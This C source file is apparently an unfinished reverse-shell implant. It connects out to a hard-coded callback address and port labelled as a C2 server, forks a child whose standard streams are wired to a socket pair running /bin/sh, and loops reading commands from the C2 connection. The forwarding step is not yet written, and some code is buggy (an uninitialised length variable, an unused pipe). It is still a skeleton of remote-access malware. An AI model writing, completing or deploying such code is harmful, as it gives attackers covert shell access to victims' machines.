#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define CALLBACK_IP "127.1"
#define CALLBACK_PORT 4444
#define BUFFER_SIZE 1024

int child_setup(int s)
{
    pid_t pid = -1;
    int sp[2] = {0, 0};

    if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
        perror("failed to create interpreter socket pair");
    }

    if ((pid = fork()) < 0)
    {
        perror("fork");
    }

    if (pid == 0)
    {
        close(sp[1]);

        dup2(sp[0], STDIN_FILENO);
        dup2(sp[0], STDOUT_FILENO);
        dup2(sp[0], STDERR_FILENO);

        system("/bin/sh");
    }

    close(sp[0]);

    return sp[1];
}

void interpreter(int sockfd, int child_pipe)
{
    struct sockaddr_in client_addr;
    socklen_t cli_len;
    char buf[BUFFER_SIZE];
    int recvlen = 0;

    char *command = "test";

    for (;;)
    {
        memset(buf, 0, sizeof(buf));

        recvlen = recvfrom(sockfd, buf, BUFFER_SIZE, 0, (struct sockaddr *) &client_addr, &cli_len);
        if (recvlen == 0)
        {
            return;
        }
        else if (recvlen < 0)
        {
            perror("recvfrom");
            exit(EXIT_FAILURE);
        }

        if (strncmp(buf, command, strlen(command)) == 0)
        {
            puts("match!");
        }
        else
        {
            puts("forward");
        }
        
    }


    
}

int main()
{
    struct sockaddr_in c2addr;
    int sockfd = 0;
    int child_pipe = 0;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed socket init");
        exit(1);
    }

    memset(&c2addr, 0, sizeof(c2addr));
    c2addr.sin_family = AF_INET;
    c2addr.sin_addr.s_addr = inet_addr(CALLBACK_IP);
    c2addr.sin_port = htons(CALLBACK_PORT); 

    if (connect(sockfd, (struct sockaddr*)&c2addr, sizeof(c2addr)) != 0)
    {
        perror("failed to connect");
        exit(2);
    }

    child_pipe = child_setup(sockfd);

    interpreter(sockfd, child_pipe);

    close(sockfd);

    return 0;
}